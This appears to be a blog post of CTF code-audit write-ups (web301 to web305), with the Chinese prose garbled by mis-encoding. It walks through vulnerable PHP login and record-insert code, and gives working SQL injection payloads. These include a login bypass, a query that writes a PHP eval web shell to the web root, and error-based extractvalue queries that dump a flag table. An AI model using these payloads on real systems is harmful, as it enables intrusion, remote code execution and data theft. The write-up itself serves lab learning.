        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><strong>ä»£ç å®¡è®¡ä¸‰è¦ç´ ï¼š</strong></p><ol><li>è€å¿ƒ</li><li>ä¿¡å¿ƒ</li><li>å†³å¿ƒ</li></ol><h1 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h1><p><a href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp" target="_blank" rel="noopener">PHP mysql_fetch_array() å‡½æ•°</a></p><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç„å‡†äº†checklogin.phpå»æå‘ç°sqlçš„æŸ¥è¯¢è¯­å¥æœ‰é—®é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210907094642609.png" alt="image-20210907094642609"></p><p><strong>æ„é€ payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php">ç”¨æˆ·åç­‰äºå¯†ç ç™»é™†userid<span class="token operator">=</span>a' union select <span class="token number">1</span><span class="token shell-comment comment">#&amp;userpwd=1</span>å†™é©¬userid<span class="token operator">=</span>a<span class="token string">' union select "&lt;?php @eval($_POST['</span>yn8rt'<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token string">" into outfile "</span><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>y<span class="token punctuation">.</span>php"<span class="token shell-comment comment">#&amp;userpwd=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sqlmapè„±åº“ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210907170814256.png" alt="image-20210907170814256"></p><h1 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select sds_password from sds_user where sds_username='"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æ­¤å¤„ä¿®æ”¹ï¼Œåº”å¯¹sds_decodeè¿›è¡Œè·Ÿè¸ª</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è·Ÿè¸ªsds_decodeåˆ°fun.phpï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¯†ç å¯ä»¥ç ´è§£ï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>d9c77c4e454869d5d8da3b4be79694d3userid<span class="token operator">=</span><span class="token string">' union select '</span>d9c77c4e454869d5d8da3b4be79694d3'<span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'fun.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//æ­¤å¤„æœ‰æ”¹åŠ¨</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"select sds_password from sds_user where sds_username='"</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™åˆ¶äº†ç”¨æˆ·åçš„é•¿åº¦ï¼Œä½†æ˜¯sds_user.sqlæ–‡ä»¶ä¸­å¤šå‡ºæ¥äº†ä¸€è¡Œæ’å…¥æ•°æ®ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“å¼€fun.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œä¸€ä¸‹å‘ç°å°±æ˜¯ç»è¿‡md5å¤„ç†çš„å€¼å°±æ˜¯adminæ‰€ä»¥å¯†ç å°±æ˜¯adminï¼Œè¿›å»ä»¥åèƒ½ç‚¹çš„åœ°æ–¹åªæœ‰é¦–é¡µæœºæ„åˆ—è¡¨ï¼Œä¸å‡ºæ„å¤–æ³¨å…¥ç‚¹åœ¨æ–°å¢ï¼Œè·Ÿè¸ªæºç ï¼š</p><p>dptadd.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//æ³¨å…¥ç‚¹</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_address'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_address</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_build_year</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_has_cert</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"on"</span><span class="token operator">?</span><span class="token string">"1"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_cert_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dpt_telephone_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"insert into sds_dpt set sds_name='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_name</span><span class="token punctuation">.</span><span class="token string">"',sds_address ='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_address</span><span class="token punctuation">.</span><span class="token string">"',sds_build_date='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_build_year</span><span class="token punctuation">.</span><span class="token string">"',sds_have_safe_card='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_has_cert</span><span class="token punctuation">.</span><span class="token string">"',sds_safe_card_num='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_cert_number</span><span class="token punctuation">.</span><span class="token string">"',sds_telephone='"</span><span class="token punctuation">.</span><span class="token variable">$dpt_telephone_number</span><span class="token punctuation">.</span><span class="token string">"';"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:dpt.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨å…¥ç‚¹æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯ä»¥æ„é€ payloadï¼š</p><p>å…ˆè®¿é—®åˆ°adtapp.phpï¼Œå¯ä»¥ææinsertæ³¨å…¥ï¼Œä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥</p><pre class="line-numbers language-mysql"><code class="language-mysql">dpt_name=yn8rt',sds_address=(select database())#dpt_name=yn8rt',sds_address=(select group_concat(flag) from  sds_fl9g)#æ’å…¥æˆåŠŸğŸ‘†dpt_name=a' or extractvalue(1,concat(0x7e,(select database()),0x7e))#æ³¨æ„æŠ¥é”™æ³¨å…¥éœ€è¦æˆªå–ï¼šdpt_name=a' or extractvalue(1,concat(0x7e,concat((select group_concat(flag) from  sds_fl9g ),30),0x7e))#dpt_name=a' or extractvalue(1,concat(0x7e,right((select group_concat(flag) from  sds_fl9g ),30),0x7e))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>è™½ç„¶è¯´å¢åŠ äº†å…¨å±€waf</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[0-9]|[a-z]|-/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯æºç ç»™çš„é“¾æ¥å´æ˜¯303çš„</p><pre class="line-numbers language-mysql"><code class="language-mysql">dpt_name=a' or extractvalue(1,concat(0x7e,left((select group_concat(flag) from  sds_fl9g ),30),0x7e))#dpt_name=a' or extractvalue(1,concat(0x7e,right((select group_concat(flag) from  sds_flaag ),30),0x7e))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h1><p><strong>å¤šäº†ä¸€ä¸ªclass.phpï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-17 13:20:37# @Last Modified by:   h1xa# @Last Modified time: 2020-12-17 13:33:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token 